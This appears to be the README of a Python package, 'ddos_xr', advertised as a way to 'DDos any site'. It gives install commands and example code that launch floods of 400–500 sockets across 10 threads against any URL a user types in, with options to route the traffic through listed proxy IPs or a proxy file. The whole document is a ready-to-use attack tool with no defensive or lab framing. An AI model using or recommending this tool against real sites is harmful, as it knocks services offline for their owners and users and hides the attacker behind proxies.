# DDos

DDos any site using python

## Install

### From PyPI

`pip3 install ddos_xr` (You should really use this version)


## Usage

### GUI

To use it just run:

```sh
DDos
```

or

```sh
ddos
```

in the terminal to launch the GUI (Tkinter is a requirement for the GUI so use: `sudo apt-get update && sudo apt-get install python3-tk -y` on Linux. On Windows it's already installed)

### TUI

To use the text-based user interface see this python example:

```py
# import the needed functions

from ddos_xr import checkUrl, DDos 

while True:
    # get a url from the user
    
    url = input("Enter URL: ") 
    
    # if it's formatted correctly exit the loop
    
    if checkUrl(url): break
    
    # else, go back
    
    else: print("This URL isn't formatted correctly, try again") 
    
# ddos this url with 400 sockets and 10 threads  

DDos(url, sockets = 400, threads = 10)
```

or simply:

```py
from ddos_xr import DDos
DDos(input("Enter URL: ")) # if the url isn't formatted correctly it will have an assertion error, use 500 sockets and 10 threads, no proxies will be used
```

The DDos function also has a `proxies` optional variable and there is a `checkProxy` function, you can use them like so:

```py
from ddos_xr import DDos, checkProxy
assert checkProxy("109.237.91.155:8080")
assert checkProxy("178.128.37.176:80")
DDos(input("Enter URL: "), proxies = ["109.237.91.155:8080", "178.128.37.176:80"])
```

If you give an invalid proxy you will get an assertion error.

Example for proxy file:
```py
from ddos_xr import DDos, checkProxy

def proxies_file(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if checkProxy(line.strip())]
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return []

url = input("Enter URL: ")
proxy_file = input("Enter the path to the proxy file: ")

proxies = proxies_file(proxy_file)

if proxies:
    DDos(url, proxies=proxies)
else:
    print("No valid proxies found.")
```
